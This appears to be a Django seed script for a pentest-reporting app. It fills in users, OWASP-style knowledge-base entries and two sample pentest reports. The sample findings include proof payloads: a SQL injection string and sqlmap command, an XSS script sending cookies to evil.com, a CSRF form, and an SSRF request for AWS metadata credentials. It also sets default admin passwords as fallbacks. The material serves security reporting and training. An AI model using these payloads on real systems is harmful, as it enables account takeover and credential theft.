"""
Django management command to seed the VulnReport database with sample data.

Usage:
    python manage.py seed_data
"""

import os

from django.core.management.base import BaseCommand

from accounts.models import User
from kb.models import KBEntry, Resource
from reports.models import Finding, Report


class Command(BaseCommand):
    help = "Seed the VulnReport database with users, KB entries, resources, and sample reports."

    def handle(self, *args, **options):
        self._create_users()
        self._create_kb_entries()
        self._create_resources()
        self._create_sample_reports()
        self.stdout.write(self.style.SUCCESS("Database seeding completed successfully."))

    # ------------------------------------------------------------------
    # Users
    # ------------------------------------------------------------------

    def _create_users(self):
        users = [
            {
                "username": "admin",
                "email": "admin@vulnreport.local",
                "password": os.environ.get("ADMIN_PASSWORD", "Admin@VulnReport2026!"),
                "role": "admin",
                "is_staff": True,
                "is_superuser": True,
            },
            {
                "username": "pentester1",
                "email": "pentester@vulnreport.local",
                "password": os.environ.get("PENTESTER_PASSWORD", "Pentester@VulnReport2026!"),
                "role": "pentester",
                "is_staff": False,
                "is_superuser": False,
            },
            {
                "username": "viewer1",
                "email": "viewer@vulnreport.local",
                "password": os.environ.get("VIEWER_PASSWORD", "Viewer@VulnReport2026!"),
                "role": "viewer",
                "is_staff": False,
                "is_superuser": False,
            },
        ]

        for data in users:
            if User.objects.filter(username=data["username"]).exists():
                self.stdout.write(
                    self.style.SUCCESS(f"User '{data['username']}' already exists -- skipped.")
                )
                continue

            user = User.objects.create_user(
                username=data["username"],
                email=data["email"],
                password=data["password"],
                role=data["role"],
                is_staff=data["is_staff"],
                is_superuser=data["is_superuser"],
            )
            self.stdout.write(
                self.style.SUCCESS(f"Created user '{user.username}' with role '{user.role}'.")
            )

    # ------------------------------------------------------------------
    # KB Entries
    # ------------------------------------------------------------------

    KB_ENTRIES = [
        {
            "name": "SQL Injection",
            "category": "injection",
            "severity_default": "critical",
            "description": (
                "SQL Injection occurs when untrusted data is sent to an interpreter as part "
                "of a command or query. The attacker's hostile data can trick the interpreter "
                "into executing unintended commands or accessing data without proper "
                "authorization. This can lead to full database compromise, data exfiltration, "
                "and in some cases remote code execution on the database server."
            ),
            "recommendation": (
                "Use parameterized queries (prepared statements) for all database interactions. "
                "Apply input validation with allow-lists where possible. Use an ORM with "
                "caution and avoid raw queries. Deploy a Web Application Firewall (WAF) as an "
                "additional layer of defense."
            ),
            "references": "CWE-89, OWASP A03:2021 - Injection",
        },
        {
            "name": "Cross-Site Scripting - Reflected",
            "category": "xss",
            "severity_default": "high",
            "description": (
                "Reflected XSS occurs when user-supplied data is included in an HTTP response "
                "without proper sanitization. The payload is reflected off the web server in "
                "error messages, search results, or other responses that include input sent as "
                "part of the request. It requires the victim to click a malicious link."
            ),
            "recommendation": (
                "Encode all output based on the context (HTML, JavaScript, URL, CSS). "
                "Implement Content Security Policy (CSP) headers. Validate and sanitize input "
                "server-side. Use templating engines that auto-escape by default."
            ),
            "references": "CWE-79, OWASP A03:2021 - Injection",
        },
        {
            "name": "Cross-Site Scripting - Stored",
            "category": "xss",
            "severity_default": "critical",
            "description": (
                "Stored XSS occurs when malicious script is permanently stored on the target "
                "server (e.g., in a database, message forum, comment field). The victim "
                "retrieves the malicious script when requesting the stored information. This "
                "variant is particularly dangerous because it does not require victim "
                "interaction beyond visiting the affected page."
            ),
            "recommendation": (
                "Apply context-aware output encoding on all user-controlled data before "
                "rendering. Sanitize rich-text input with a proven library such as DOMPurify. "
                "Enforce a strict Content Security Policy. Store data in its raw form and "
                "encode on output."
            ),
            "references": "CWE-79, CWE-80, OWASP A03:2021 - Injection",
        },
        {
            "name": "Broken Access Control - IDOR",
            "category": "access_control",
            "severity_default": "high",
            "description": (
                "Insecure Direct Object Reference (IDOR) occurs when an application exposes a "
                "reference to an internal implementation object (e.g., a database key or file "
                "path) and fails to verify that the user is authorized to access the target "
                "object. Attackers can manipulate these references to access unauthorized data."
            ),
            "recommendation": (
                "Implement server-side access control checks for every request to a resource. "
                "Use indirect references or UUIDs instead of sequential IDs. Validate that the "
                "authenticated user has permission to access the requested object. Log and "
                "alert on repeated unauthorized access attempts."
            ),
            "references": "CWE-639, OWASP A01:2021 - Broken Access Control",
        },
        {
            "name": "Broken Access Control - Privilege Escalation",
            "category": "access_control",
            "severity_default": "critical",
            "description": (
                "Privilege escalation occurs when an attacker gains elevated access to "
                "resources that should be restricted. Vertical escalation allows a lower-"
                "privileged user to access functions reserved for higher-privileged users. "
                "Horizontal escalation allows access to resources belonging to other users at "
                "the same privilege level."
            ),
            "recommendation": (
                "Enforce role-based access control (RBAC) on every privileged endpoint. "
                "Deny by default and explicitly grant permissions. Avoid relying solely on "
                "client-side role checks. Regularly audit permission assignments and test "
                "authorization logic with automated tools."
            ),
            "references": "CWE-269, CWE-285, OWASP A01:2021 - Broken Access Control",
        },
        {
            "name": "Cross-Site Request Forgery (CSRF)",
            "category": "csrf",
            "severity_default": "medium",
            "description": (
                "CSRF forces an authenticated user to submit a request to a web application "
                "against which they are currently authenticated. The attack leverages the "
                "victim's active session and tricks the browser into sending a forged request "
                "containing the victim's session cookie."
            ),
            "recommendation": (
                "Use anti-CSRF tokens (synchronizer token pattern) for all state-changing "
                "requests. Set the SameSite attribute on session cookies to 'Lax' or 'Strict'. "
                "Verify the Origin and Referer headers server-side. Require re-authentication "
                "for sensitive operations."
            ),
            "references": "CWE-352, OWASP A01:2021 - Broken Access Control",
        },
        {
            "name": "Server-Side Request Forgery (SSRF)",
            "category": "ssrf",
            "severity_default": "high",
            "description": (
                "SSRF allows an attacker to induce the server-side application to make HTTP "
                "requests to an arbitrary domain of the attacker's choosing. This can be used "
                "to access internal services behind firewalls, scan internal networks, or "
                "interact with cloud metadata endpoints (e.g., AWS IMDSv1 at 169.254.169.254)."
            ),
            "recommendation": (
                "Validate and sanitize all user-supplied URLs. Use allow-lists of permitted "
                "domains and IP ranges. Block requests to private/internal IP ranges "
                "(10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16). Disable "
                "unnecessary URL schemes (file://, gopher://, dict://). Use network-level "
                "segmentation."
            ),
            "references": "CWE-918, OWASP A10:2021 - Server-Side Request Forgery",
        },
        {
            "name": "Security Misconfiguration",
            "category": "misconfiguration",
            "severity_default": "medium",
            "description": (
                "Security misconfiguration is the most commonly seen issue. It can occur at "
                "any level of the application stack: network services, platform, web server, "
                "application framework, database, or custom code. Examples include default "
                "credentials, unnecessary services enabled, verbose error messages, and "
                "missing security headers."
            ),
            "recommendation": (
                "Implement a hardening process for all environments. Remove or disable unused "
                "features, frameworks, and accounts. Change default credentials. Configure "
                "security headers (X-Content-Type-Options, X-Frame-Options, Strict-Transport-"
                "Security). Automate configuration audits using tools like CIS Benchmarks."
            ),
            "references": "CWE-16, OWASP A05:2021 - Security Misconfiguration",
        },
        {
            "name": "Sensitive Data Exposure",
            "category": "data_exposure",
            "severity_default": "high",
            "description": (
                "Sensitive data exposure occurs when an application does not adequately protect "
                "sensitive information such as financial data, healthcare records, or personal "
                "identifiable information (PII). This can happen through insecure storage, "
                "transmission over unencrypted channels, weak cryptographic algorithms, or "
                "unnecessary data retention."
            ),
            "recommendation": (
                "Classify data processed, stored, or transmitted by the application. Apply "
                "controls as per the classification. Encrypt all sensitive data at rest and in "
                "transit using strong algorithms (AES-256, TLS 1.2+). Do not store sensitive "
                "data unnecessarily. Mask PII in logs and error messages."
            ),
            "references": "CWE-200, CWE-311, OWASP A02:2021 - Cryptographic Failures",
        },
        {
            "name": "Broken Authentication",
            "category": "auth",
            "severity_default": "critical",
            "description": (
                "Broken authentication vulnerabilities allow attackers to compromise passwords, "
                "keys, or session tokens, or to exploit implementation flaws to assume other "
                "users' identities. Weak password policies, credential stuffing, lack of "
                "multi-factor authentication, and improper session management are common "
                "causes."
            ),
            "recommendation": (
                "Implement multi-factor authentication (MFA). Enforce strong password policies "
                "(minimum 12 characters, complexity requirements). Use secure session "
                "management with proper timeout and invalidation. Protect against brute-force "
                "with account lockout or rate limiting. Never expose session IDs in URLs."
            ),
            "references": "CWE-287, CWE-384, OWASP A07:2021 - Identification and Authentication Failures",
        },
        {
            "name": "XML External Entity (XXE)",
            "category": "injection",
            "severity_default": "high",
            "description": (
                "XXE attacks target applications that parse XML input. If the XML parser is "
                "configured to process external entity references, an attacker can use this "
                "feature to read local files, perform SSRF, execute denial-of-service attacks, "
                "or in some cases achieve remote code execution."
            ),
            "recommendation": (
                "Disable external entity and DTD processing in all XML parsers. Use less "
                "complex data formats such as JSON where possible. Patch or upgrade all XML "
                "processors and libraries. Implement server-side input validation and "
                "filtering of XML content."
            ),
            "references": "CWE-611, OWASP A05:2021 - Security Misconfiguration",
        },
        {
            "name": "Insecure Deserialization",
            "category": "injection",
            "severity_default": "high",
            "description": (
                "Insecure deserialization occurs when untrusted data is used to abuse the "
                "logic of an application, inflict denial-of-service, or execute arbitrary code "
                "during the deserialization process. Attackers can manipulate serialized "
                "objects to perform injection attacks, replay attacks, or privilege escalation."
            ),
            "recommendation": (
                "Do not accept serialized objects from untrusted sources. Use serialization "
                "formats that only permit primitive data types (e.g., JSON). Implement "
                "integrity checks (digital signatures) on serialized objects. Monitor and "
                "alert on deserialization exceptions. Isolate deserialization code in low-"
                "privilege environments."
            ),
            "references": "CWE-502, OWASP A08:2021 - Software and Data Integrity Failures",
        },
        {
            "name": "Using Components with Known Vulnerabilities",
            "category": "supply_chain",
            "severity_default": "medium",
            "description": (
                "Applications using components (libraries, frameworks, modules) with known "
                "vulnerabilities may undermine application defenses and enable various attacks. "
                "Components typically run with the same privileges as the application itself, "
                "so flaws in any component can be exploited to compromise the entire system."
            ),
            "recommendation": (
                "Maintain an inventory of all components and their versions (SBOM). "
                "Continuously monitor sources like CVE, NVD, and GitHub Advisories. Remove "
                "unused dependencies. Use tools like Dependabot, Snyk, or OWASP Dependency-"
                "Check to automate vulnerability scanning. Pin dependency versions and test "
                "updates before deployment."
            ),
            "references": "CWE-1035, OWASP A06:2021 - Vulnerable and Outdated Components",
        },
        {
            "name": "Insufficient Logging & Monitoring",
            "category": "monitoring",
            "severity_default": "medium",
            "description": (
                "Insufficient logging and monitoring, coupled with missing or ineffective "
                "integration with incident response, allows attackers to further attack "
                "systems, maintain persistence, pivot to more systems, and tamper, extract, or "
                "destroy data. Most breach studies show time to detect a breach is over 200 "
                "days, typically detected by external parties."
            ),
            "recommendation": (
                "Ensure all login, access control, and server-side input validation failures "
                "are logged with sufficient context. Use a centralized log management solution "
                "(SIEM). Establish effective monitoring and alerting so suspicious activities "
                "are detected in near real-time. Create an incident response and recovery "
                "plan."
            ),
            "references": "CWE-778, OWASP A09:2021 - Security Logging and Monitoring Failures",
        },
        {
            "name": "Path Traversal",
            "category": "injection",
            "severity_default": "high",
            "description": (
                "Path traversal (directory traversal) attacks aim to access files and "
                "directories outside the intended directory by manipulating variables that "
                "reference files with dot-dot-slash (../) sequences or absolute paths. This "
                "can lead to reading sensitive files such as /etc/passwd, application source "
                "code, or configuration files containing credentials."
            ),
            "recommendation": (
                "Validate user input strictly: reject any input containing path traversal "
                "characters. Use a chroot jail or similar sandboxing mechanism. Map user input "
                "to an allow-list of permitted filenames. Use canonical path checks to resolve "
                "and verify the final path stays within the intended directory."
            ),
            "references": "CWE-22, OWASP A01:2021 - Broken Access Control",
        },
    ]

    def _create_kb_entries(self):
        if KBEntry.objects.exists():
            self.stdout.write(
                self.style.SUCCESS("KB entries already exist -- skipped.")
            )
            return

        for entry_data in self.KB_ENTRIES:
            KBEntry.objects.create(**entry_data)
            self.stdout.write(
                self.style.SUCCESS(f"Created KB entry: {entry_data['name']}")
            )

    # ------------------------------------------------------------------
    # Resources
    # ------------------------------------------------------------------

    RESOURCES = [
        {
            "title": "PortSwigger Web Security Academy",
            "category": "lab",
            "url": "https://portswigger.net/web-security",
            "description": (
                "Free online training platform for web security with interactive labs "
                "covering all major vulnerability classes."
            ),
        },
        {
            "title": "OWASP Testing Guide",
            "category": "guide",
            "url": "https://owasp.org/www-project-web-security-testing-guide/",
            "description": (
                "Comprehensive guide for testing the security of web applications and web "
                "services, maintained by the OWASP Foundation."
            ),
        },
        {
            "title": "OWASP Top 10",
            "category": "cheatsheet",
            "url": "https://owasp.org/www-project-top-ten/",
            "description": (
                "Standard awareness document for developers and web application security "
                "representing the most critical web application security risks."
            ),
        },
        {
            "title": "HackTheBox",
            "category": "lab",
            "url": "https://www.hackthebox.com/",
            "description": (
                "Online platform providing virtual machines and challenges to practice "
                "penetration testing and cybersecurity skills."
            ),
        },
        {
            "title": "TryHackMe",
            "category": "lab",
            "url": "https://tryhackme.com/",
            "description": (
                "Gamified learning platform for cybersecurity with guided rooms and "
                "hands-on exercises for beginners and advanced practitioners."
            ),
        },
        {
            "title": "CWE Database",
            "category": "guide",
            "url": "https://cwe.mitre.org/",
            "description": (
                "Community-developed list of common software and hardware weakness types "
                "serving as a baseline for vulnerability identification and mitigation."
            ),
        },
    ]

    def _create_resources(self):
        if Resource.objects.exists():
            self.stdout.write(
                self.style.SUCCESS("Resources already exist -- skipped.")
            )
            return

        for res_data in self.RESOURCES:
            Resource.objects.create(**res_data)
            self.stdout.write(
                self.style.SUCCESS(f"Created resource: {res_data['title']}")
            )

    # ------------------------------------------------------------------
    # Sample Reports & Findings
    # ------------------------------------------------------------------

    def _create_sample_reports(self):
        try:
            pentester = User.objects.get(username="pentester1")
        except User.DoesNotExist:
            self.stdout.write(
                self.style.WARNING(
                    "User 'pentester1' not found -- skipping sample reports."
                )
            )
            return

        if Report.objects.filter(owner=pentester).exists():
            self.stdout.write(
                self.style.SUCCESS("Sample reports already exist -- skipped.")
            )
            return

        # --- Report 1: Web Application Alpha ---
        report_alpha = Report.objects.create(
            title="Pentest Web Application Alpha",
            context=(
                "Penetration test conducted on the Alpha web application (https://alpha."
                "example.com) during March 2026. Scope included the full web application, "
                "REST API, and authentication flows. Testing was performed in a staging "
                "environment with valid user credentials provided by the client."
            ),
            executive_summary=(
                "The assessment identified three vulnerabilities ranging from critical to "
                "medium severity. A critical SQL injection vulnerability was found in the "
                "search endpoint, along with a stored XSS in the user profile and a CSRF "
                "weakness in account settings. Immediate remediation is recommended for the "
                "SQL injection finding."
            ),
            status="in_progress",
            owner=pentester,
        )
        self.stdout.write(
            self.style.SUCCESS(f"Created report: {report_alpha.title}")
        )

        # Finding 1 - from KB (SQL Injection)
        sqli_kb = KBEntry.objects.filter(name="SQL Injection").first()
        Finding.objects.create(
            title="SQL Injection in Search Endpoint",
            description=(
                "The /api/v1/search endpoint is vulnerable to SQL injection via the 'q' "
                "parameter. The application concatenates user input directly into a SQL "
                "query without parameterization or sanitization."
            ),
            proof=(
                "Request: GET /api/v1/search?q=' OR 1=1 --\n"
                "Response: 200 OK with all database records returned.\n\n"
                "Using sqlmap: sqlmap -u 'https://alpha.example.com/api/v1/search?q=test' "
                "--dbs\nResult: enumerated 3 databases (alpha_prod, information_schema, mysql)."
            ),
            impact=(
                "An attacker can extract, modify, or delete any data in the database. "
                "Depending on the database configuration, it may also be possible to read "
                "or write files on the server and execute operating system commands."
            ),
            recommendation=(
                "Replace all dynamic SQL queries with parameterized statements. Apply "
                "input validation using an allow-list approach for the search parameter."
            ),
            references="CWE-89, OWASP A03:2021",
            severity="critical",
            cvss_score=9.8,
            order=1,
            report=report_alpha,
            kb_entry=sqli_kb,
        )
        self.stdout.write(
            self.style.SUCCESS("  -> Created finding: SQL Injection in Search Endpoint")
        )

        # Finding 2 - custom (Stored XSS)
        Finding.objects.create(
            title="Stored XSS in User Profile Bio",
            description=(
                "The user profile biography field does not sanitize HTML input before "
                "storing or rendering it. An attacker can inject arbitrary JavaScript code "
                "that executes in the context of any user viewing the profile."
            ),
            proof=(
                "Payload injected in bio field: <script>fetch('https://evil.com/steal?c='"
                "+document.cookie)</script>\n\n"
                "When another user visits the profile page, the script executes and "
                "exfiltrates the session cookie."
            ),
            impact=(
                "Session hijacking, account takeover, defacement, and phishing attacks "
                "against other users of the platform."
            ),
            recommendation=(
                "Sanitize all user-generated HTML using a library like DOMPurify before "
                "rendering. Apply Content Security Policy headers to mitigate the impact "
                "of successful injection."
            ),
            references="CWE-79, OWASP A03:2021",
            severity="high",
            cvss_score=7.1,
            order=2,
            report=report_alpha,
            kb_entry=None,
        )
        self.stdout.write(
            self.style.SUCCESS("  -> Created finding: Stored XSS in User Profile Bio")
        )

        # Finding 3 - custom (CSRF)
        Finding.objects.create(
            title="CSRF on Account Settings Update",
            description=(
                "The account settings page (/settings/profile) does not include an anti-CSRF "
                "token in its forms. A malicious page can submit a forged request to change "
                "the victim's email address and notification preferences."
            ),
            proof=(
                "Created an HTML page with a hidden form that submits a POST request to "
                "/settings/profile with a new email address. When an authenticated user "
                "visits the page, their email is silently changed.\n\n"
                "<form action='https://alpha.example.com/settings/profile' method='POST'>\n"
                "  <input type='hidden' name='email' value='attacker@evil.com'/>\n"
                "  <input type='submit'/>\n"
                "</form>"
            ),
            impact=(
                "An attacker can modify the victim's account settings, potentially leading "
                "to account takeover by changing the recovery email address."
            ),
            recommendation=(
                "Implement anti-CSRF tokens (synchronizer token pattern) on all state-"
                "changing forms. Set the SameSite cookie attribute to 'Lax' or 'Strict'."
            ),
            references="CWE-352, OWASP A01:2021",
            severity="medium",
            cvss_score=5.4,
            order=3,
            report=report_alpha,
            kb_entry=None,
        )
        self.stdout.write(
            self.style.SUCCESS("  -> Created finding: CSRF on Account Settings Update")
        )

        # --- Report 2: Audit Securite API Beta ---
        report_beta = Report.objects.create(
            title="Audit Securite API Beta",
            context=(
                "Security audit of the Beta REST API (https://api-beta.example.com) "
                "performed in March 2026. The scope covered all API endpoints, "
                "authentication mechanisms, and data handling practices. Testing was "
                "conducted in a dedicated staging environment."
            ),
            executive_summary=(
                "Two significant vulnerabilities were identified during the audit. A broken "
                "access control issue (IDOR) allows unauthorized access to other users' "
                "data, and a server-side request forgery (SSRF) vulnerability exists in the "
                "URL preview feature. Both require prompt remediation."
            ),
            status="draft",
            owner=pentester,
        )
        self.stdout.write(
            self.style.SUCCESS(f"Created report: {report_beta.title}")
        )

        # Finding 1 - from KB (IDOR)
        idor_kb = KBEntry.objects.filter(
            name="Broken Access Control - IDOR"
        ).first()
        Finding.objects.create(
            title="IDOR on User Data API Endpoint",
            description=(
                "The /api/v1/users/{id}/data endpoint returns sensitive user data without "
                "verifying that the authenticated user is authorized to access the requested "
                "user's information. By incrementing the user ID parameter, an attacker can "
                "access data belonging to any user."
            ),
            proof=(
                "Authenticated as user ID 42, sent request:\n"
                "GET /api/v1/users/1/data\n"
                "Authorization: Bearer <token_for_user_42>\n\n"
                "Response: 200 OK with full profile data for user ID 1 (admin account), "
                "including email, phone number, and internal notes."
            ),
            impact=(
                "Complete exposure of all users' personal data, including PII and internal "
                "notes. An attacker can enumerate all users by iterating over sequential IDs."
            ),
            recommendation=(
                "Implement server-side authorization checks ensuring the authenticated user "
                "can only access their own data, or has explicit permission for the target "
                "resource. Replace sequential IDs with UUIDs."
            ),
            references="CWE-639, OWASP A01:2021",
            severity="high",
            cvss_score=7.5,
            order=1,
            report=report_beta,
            kb_entry=idor_kb,
        )
        self.stdout.write(
            self.style.SUCCESS("  -> Created finding: IDOR on User Data API Endpoint")
        )

        # Finding 2 - custom (SSRF)
        Finding.objects.create(
            title="SSRF via URL Preview Feature",
            description=(
                "The /api/v1/preview endpoint accepts a user-supplied URL and fetches its "
                "content server-side to generate a link preview. The endpoint does not "
                "validate or restrict the target URL, allowing requests to internal services "
                "and cloud metadata endpoints."
            ),
            proof=(
                "Request:\n"
                "POST /api/v1/preview\n"
                '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}\n\n'
                "Response: 200 OK with AWS IAM role name returned. A follow-up request to "
                "the role-specific endpoint returned temporary AWS credentials."
            ),
            impact=(
                "Access to internal services not exposed to the internet. Retrieval of "
                "cloud instance metadata including temporary IAM credentials, which can lead "
                "to full cloud infrastructure compromise."
            ),
            recommendation=(
                "Implement a strict allow-list of permitted domains and URL schemes. Block "
                "all requests to private IP ranges and cloud metadata endpoints. Use a "
                "dedicated HTTP client with no redirect following."
            ),
            references="CWE-918, OWASP A10:2021",
            severity="high",
            cvss_score=8.6,
            order=2,
            report=report_beta,
            kb_entry=None,
        )
        self.stdout.write(
            self.style.SUCCESS("  -> Created finding: SSRF via URL Preview Feature")
        )
